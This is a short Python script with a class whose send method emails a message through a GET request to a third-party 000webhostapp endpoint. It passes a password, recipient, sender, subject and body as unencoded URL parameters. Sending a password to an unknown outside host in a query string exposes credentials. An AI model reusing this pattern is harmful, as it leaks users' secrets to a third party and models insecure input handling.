import requests


class main:
   def __init__(self,password,to,form,subject,msg):
          self.password = password
          self.to = to
          self.form = form
          self.subject = subject
          self.msg = msg
   def send(self):
      password = self.password
      to = self.to
      form = self.form
      subject = self.subject
      msg = self.msg
      a = requests.get('https://kingofboy.000webhostapp.com/get/index.php?password='+password+'&to='+to+'&subject='+subject+'&email='+form+'&message='+msg+'&submit=Submit')
      print('msg sent \r\n')
      print(a.status_code)
      